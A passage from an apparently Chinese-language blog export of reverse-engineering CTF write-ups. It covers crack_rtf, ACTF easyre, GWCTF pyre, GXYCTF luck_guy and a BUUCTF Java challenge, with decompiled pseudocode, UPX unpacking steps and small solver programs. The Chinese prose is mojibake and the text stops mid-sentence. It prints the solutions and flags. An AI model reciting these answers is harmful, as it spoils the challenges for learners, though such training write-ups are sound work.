( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">    <span class="comment">//å¾ªç¯å¼‚æˆ–</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°å°†èµ„æºæ–‡ä»¶æ¯ä¸ªå­—èŠ‚ä¸<code>ç¬¬äºŒæ®µå¯†ç +ç¬¬ä¸€æ®µå¯†ç +@DBApp</code>ç»„æˆå¯†é’¥è¿›è¡Œå¾ªç¯å¼‚æˆ–ä»è€Œè§£å¯†å‡º<strong>flag</strong>æ–‡ä»¶.
çªç ´ç‚¹å°±åœ¨<strong>flag</strong>æ–‡ä»¶çš„å‰6ä¸ªå­—èŠ‚ä¸Š, è¦çŸ¥é“,
<code>RTF</code>æ ¼å¼ä¸åƒ<code>txt</code>è¿™ç§æ–‡æœ¬æ ¼å¼, å®ƒæ˜¯æœ‰æ–‡ä»¶å¤´çš„,
è€Œæ–‡ä»¶å¤´å¾€å¾€æ˜¯å›ºå®šçš„!
æ—¢ç„¶<strong>flag</strong>æ˜¯ä¸ª<code>RTF</code>æ ¼å¼çš„æ–‡ä»¶,
é‚£ä¹ˆå®ƒä¸€å®šç¬¦åˆ<code>RTF</code>çš„æ–‡ä»¶å¤´è§„èŒƒ. æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™å·²çŸ¥çš„6ä¸ªå­—èŠ‚,
å€’æ¨å‡ºå¯†é’¥å‰6å­—èŠ‚, å³ç¬¬äºŒæ®µå¯†ç .</p>
<p>æ‰¾ä¸ª<code>RTF</code>æ–‡ä»¶çœ‹çœ‹å‰é¢6å­—èŠ‚</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201262117489.png"
alt="image-20220126211735455" />
<figcaption aria-hidden="true">image-20220126211735455</figcaption>
</figure>
<p>å‰6å­—èŠ‚æ˜¯<code>0x7B, 0x5C, 0x72, 0x74, 0x66, 0x31</code></p>
<p>å†™å‡ºè§£å¯†ä»£ç </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;crack_rtf.exe&quot;</span>);</span><br><span class="line">	<span class="comment">//å°†ç¨‹åºè½½å…¥è·å–æ¨¡å—å¥æŸ„</span></span><br><span class="line">	<span class="keyword">if</span> (!hModule)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	HRSRC hResInfo = <span class="built_in">FindResourceA</span>(hModule, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hResInfo)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	HGLOBAL hResData = <span class="built_in">LoadResource</span>(hModule, hResInfo);</span><br><span class="line">	<span class="keyword">if</span> (!hResData)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	BYTE* lpRes = (BYTE*)<span class="built_in">LockResource</span>(hResData);</span><br><span class="line">	<span class="keyword">if</span> (!lpRes)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	BYTE lpHeaderByte[<span class="number">6</span>] = &#123; <span class="number">0x7B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x31</span> &#125;;</span><br><span class="line">	<span class="comment">//RTFæ–‡ä»¶å¤´å‰6å­—èŠ‚</span></span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">		<span class="keyword">for</span> (BYTE c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//ç©·ä¸¾æ‰€æœ‰ASCIIå¯æ‰“å°å­—ç¬¦</span></span><br><span class="line">			<span class="keyword">if</span> ((lpRes[i] ^ c) == lpHeaderByte[i])	<span class="comment">//éªŒè¯å­—ç¬¦</span></span><br><span class="line">				<span class="built_in">putchar</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//~!3a@0</span></span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆ, <strong>flag</strong>ä¸º<code>flag&#123;N0_M0re_Free_Bugs&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTFæ–°ç”Ÿèµ›2020]easyre</title>
    <url>/2022/01/23/%5BReverse%5DACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre/</url>
    <content><![CDATA[<p>æœ‰<code>UPX</code>å£³, å…ˆè„±å£³<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232317210.png"
alt="image-20220123231753142" /></p>
<p>è¿™æ¬¡é‡‡ç”¨<code>å †æ ˆå¹³è¡¡æ³•(espå®šå¾‹æ³•)</code>æ¥å¯»æ‰¾<code>popad</code>,
ä»è€Œæ‰¾åˆ°ç¨‹åºçš„çœŸæ­£çš„å…¥å£. ä¹Ÿå¯ä»¥é‡‡ç”¨ç›´æ¥æ‰¾<code>popad</code>çš„æ–¹æ³•,
<code>UPX</code>ä¸€èˆ¬å¯ä»¥è¿™ä¹ˆå¹², è§ <a
href="/2022/01/20/%5BReverse%5Dæ–°å¹´å¿«ä¹/">[BUUCTF]æ–°å¹´å¿«ä¹</a></p>
<p>ç¨‹åºçš„å…¥å£ç‚¹æ˜¯ä¸€ä¸ª<code>pushad</code>, F8è®©å®ƒæ‰§è¡Œ,
æ”¹å˜<code>esp</code>, å¯¹<code>esp</code>ä¸‹ç¡¬ä»¶æ–­ç‚¹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232325493.png"
alt="image-20220123232551388" />
<figcaption aria-hidden="true">image-20220123232551388</figcaption>
</figure>
<p>ç„¶åè®©ç¨‹åºè·‘èµ·æ¥, è¢«ç¡¬ä»¶æ–­ç‚¹æ–­ä¸‹,
å¯ä»¥çœ‹åˆ°åˆšå¥½æ–­åœ¨<code>popad</code>ä¹‹å.</p>
<p>ä¸€èˆ¬å¯¹äº<code>UPX</code>æ¥è¯´<code>popad</code>ä¹‹åçš„ç¬¬ä¸€ä¸ª<code>jmp</code>å°±æ˜¯è·³åˆ°ç¨‹åºçœŸæ­£çš„å…¥å£ç‚¹,
è¿™é‡Œæ˜¯<code>0x401280</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201232327307.png"
alt="image-20220123232745208" />
<figcaption aria-hidden="true">image-20220123232745208</figcaption>
</figure>
<p>ç„¶åç”¨<code>Scylla</code>æ’ä»¶è„±å£³, ç”¨æ³•è§ <a
href="/2022/01/20/%5BReverse%5Dæ–°å¹´å¿«ä¹/">[BUUCTF]æ–°å¹´å¿«ä¹</a></p>
<p>è„±å£³å®Œäº†æ‹–è¿›<code>IDA</code>, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401A10();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);		<span class="comment">//åˆ©ç”¨scanf()çš„æº¢å‡ºå»ä¿®æ”¹v7~v10</span></span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="string">&#x27;A&#x27;</span> || v6[<span class="number">1</span>] != <span class="string">&#x27;C&#x27;</span> || v6[<span class="number">2</span>] != <span class="string">&#x27;T&#x27;</span> || v6[<span class="number">3</span>] != <span class="string">&#x27;F&#x27;</span> || v6[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> || v10 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">    <span class="comment">//åˆ¤æ–­è¾“å…¥æ ¼å¼ç¬¦ä¸ç¬¦åˆACTF&#123;...&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != byte_402000[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="comment">//é€ä¸ªå­—èŠ‚å¯¹æ¯”, å¯ä»¥é€šè¿‡åœ¨ç è¡¨ä¸­é€ä½ç©·ä¸¾æ¥é€†æ¨å‡ºv5çš„æ¯ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å–å¾—v5çš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> v4[] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">char</span> v5[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byte_402000[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">126</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">122</span>, <span class="number">121</span>, <span class="number">120</span>, <span class="number">119</span>, <span class="number">118</span>, <span class="number">117</span>,</span><br><span class="line">      <span class="number">116</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">113</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">107</span>,</span><br><span class="line">      <span class="number">106</span>, <span class="number">105</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">100</span>,  <span class="number">99</span>,  <span class="number">98</span>,  <span class="number">97</span>,</span><br><span class="line">       <span class="number">96</span>,  <span class="number">95</span>,  <span class="number">94</span>,  <span class="number">93</span>,  <span class="number">92</span>,  <span class="number">91</span>,  <span class="number">90</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">87</span>,</span><br><span class="line">       <span class="number">86</span>,  <span class="number">85</span>,  <span class="number">84</span>,  <span class="number">83</span>,  <span class="number">82</span>,  <span class="number">81</span>,  <span class="number">80</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">77</span>,</span><br><span class="line">       <span class="number">76</span>,  <span class="number">75</span>,  <span class="number">74</span>,  <span class="number">73</span>,  <span class="number">72</span>,  <span class="number">71</span>,  <span class="number">70</span>,  <span class="number">69</span>,  <span class="number">68</span>,  <span class="number">67</span>,</span><br><span class="line">       <span class="number">66</span>,  <span class="number">65</span>,  <span class="number">64</span>,  <span class="number">63</span>,  <span class="number">62</span>,  <span class="number">61</span>,  <span class="number">60</span>,  <span class="number">59</span>,  <span class="number">58</span>,  <span class="number">57</span>,</span><br><span class="line">       <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">54</span>,  <span class="number">53</span>,  <span class="number">52</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">49</span>,  <span class="number">48</span>,  <span class="number">47</span>,</span><br><span class="line">       <span class="number">46</span>,  <span class="number">45</span>,  <span class="number">44</span>,  <span class="number">43</span>,  <span class="number">42</span>,  <span class="number">41</span>,  <span class="number">40</span>,  <span class="number">39</span>,  <span class="number">38</span>,  <span class="number">37</span>,</span><br><span class="line">       <span class="number">36</span>,  <span class="number">35</span>,  <span class="number">32</span>,  <span class="number">33</span>,  <span class="number">34</span>,   <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">sizeof</span>(byte_402000); j++)</span><br><span class="line">            <span class="comment">//è®¾v5[i]-1=j, ç©·ä¸¾å‡ºjçš„å€¼</span></span><br><span class="line">            <span class="keyword">if</span> (v4[i] == byte_402000[j])</span><br><span class="line">                v5[i] = j + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//U9X_1S_W6@T?</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°±å¾—å‡º<code>ACTF&#123;U9X_1S_W6@T?&#125;</code>, éªŒè¯ä¸€ä¸‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201240044767.png"
alt="image-20220124004429711" />
<figcaption aria-hidden="true">image-20220124004429711</figcaption>
</figure>
<p>æ²¡é—®é¢˜,
æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;U9X_1S_W6@T?&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>[GWCTF 2019]pyre</title>
    <url>/2022/01/23/%5BReverse%5DGWCTF-2019-pyre/</url>
    <content><![CDATA[<p><code>Python</code>çš„é€†å‘,
é‡‡ç”¨<code>uncompyle6</code>è¿›è¡Œ"åç¼–è¯‘"</p>
<blockquote>
<p>uncompyle6: <a
href="https://github.com/rocky/python-uncompyle6">Github</a></p>
</blockquote>
<p>å®‰è£…å¾ˆç®€å•,
ç›´æ¥ç”¨<code>pip</code>å®‰è£…å°±å¯ä»¥äº†(<code>pip</code>å»ºè®®å…ˆæ¢æº)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ä¹Ÿç®€å•,
æ¯”å¦‚è¦åç¼–è¯‘<code>test.pyc</code>è¾“å‡ºåˆ°<code>decompile.py</code>æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o decompile.py test.pyc</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231803989.png"
alt="image-20220123180336910" />
<figcaption aria-hidden="true">image-20220123180336910</figcaption>
</figure>
<p>åç¼–è¯‘å‡ºæ¥çš„<code>Python</code>ä»£ç æœ‰äº›é—®é¢˜,
è¿˜æ˜¯<code>Python2</code>çš„, ä¸è¿‡å‡ºé¢˜äººçš„æ„å›¾å¾ˆæ˜æ˜¾,
æœ€ä¸‹é¢çš„<code>code</code>åº”è¯¥æ˜¯<code>input1</code>ç»è¿‡ä¸¤æ¬¡å˜æ¢åçš„ç»“æœ,
è¦ç”¨å®ƒé€†æ¨å‡º<code>input1</code>.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231818958.png"
alt="image-20220123181846852" />
<figcaption aria-hidden="true">image-20220123181846852</figcaption>
</figure>
<p>å¯ä»¥å¯¹æ¯ä¸€ä½ç©·ä¸¾, ç…§ç€è¿™ä¸ªä»£ç é‡Œçš„å˜æ¢è§„åˆ™æ¥å°±è¡Œ, è§£å¯†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> arr[] = &#123; <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> result[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">sizeof</span>(arr) - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)	<span class="comment">//å…ˆè¿›è¡Œä¸€æ¬¡å¼‚æˆ–,åˆæ­¥è¿˜åŸå†…å®¹</span></span><br><span class="line">		arr[i] = arr[i] ^ arr[i + <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(arr); i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)		<span class="comment">//ç©·ä¸¾æ‰€æœ‰å¯æ‰“å°ASCIIå­—ç¬¦</span></span><br><span class="line">			<span class="keyword">if</span> (((j + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span> == arr[i])</span><br><span class="line">				result[i] = j;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;Just_Re_1s_Ha66y!&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>é€†å‘</tag>
        <tag>Pythoné€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]luck_guy</title>
    <url>/2022/01/22/%5BReverse%5DGXYCTF2019-luck-guy/</url>
    <content><![CDATA[<p>ä¸æ˜¯PEæ–‡ä»¶, è¿›<code>IDA</code>åˆ†æ, F5çœ‹ä¼ªä»£ç .</p>
<p><code>main()</code>é‡Œé¢æœ‰ä¸ª<code>patch_me()</code>,
åœ¨<code>patch_me()</code>é‡Œé¢æ‰¾åˆ°<code>get_flag()</code>å…³é”®å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);                    <span class="comment">//æ—¶é—´ä½œä¸ºéšæœºæ•°ç§å­</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )     <span class="comment">//éšæœºæ•°å†³å®šæ‰§è¡Œå“ªä¸ªcase</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);    <span class="comment">//f1=&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…³é”®å°±åœ¨<code>1,4,5</code>è¿™ä¸‰ä¸ª<code>case</code>é‡Œ,
åº”è¯¥è¦ä»¥åˆé€‚çš„é¡ºåºæ‰§è¡Œæ‰èƒ½å¾—åˆ°<strong>flag</strong></p>
<p>åˆ†æå‡ºæ¥æ­£ç¡®çš„é¡ºåºåº”è¯¥æ˜¯<code>4,5,1</code>, å†™æˆPythonä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string0 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;\x69\x63\x75\x67\x60\x6f\x66\x7f&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(string1)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        string0 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(string1[i]) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(string0)</span><br><span class="line"><span class="comment">#GXY&#123;do_not_hate_me&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>GXY&#123;do_not_hate_me&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]Javaé€†å‘è§£å¯†</title>
    <url>/2022/01/22/%5BReverse%5DJava%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>ç»™çš„æ˜¯ä¸€ä¸ª<code>Java</code>å­—èŠ‚ç æ–‡ä»¶,
<code>Java</code>å­—èŠ‚ç çš„åç¼–è¯‘è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„, å¯ä»¥ç›´æ¥æ‹¿åˆ°æºç ,
é‡‡ç”¨<code>jad</code>åç¼–è¯‘</p>
<blockquote>
<p>jadåç¼–è¯‘å·¥å…·: <a href="https://varaneckas.com/jad/">å®˜ç½‘</a></p>
</blockquote>
<p>Javaæºç å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.</span></span><br><span class="line"><span class="comment">// Jad home page: http://www.kpdus.com/jad.html</span></span><br><span class="line"><span class="comment">// Decompiler options: packimports(3) </span></span><br><span class="line"><span class="comment">// Source File Name:   Reverse.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Reverse</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag \uFF1A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();    <span class="comment">//åº”è¯¥æ˜¯ä¸ªé˜»å¡æ–¹æ³•, ç­‰å¾…ç”¨æˆ·çš„è¾“å…¥</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is \uFF1A&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        <span class="type">char</span> stringArr[] = str.toCharArray();</span><br><span class="line">        Encrypt(stringArr);       <span class="comment">//å¯¹å­—ç¬¦æ•°ç»„è¿›è¡ŒåŠ 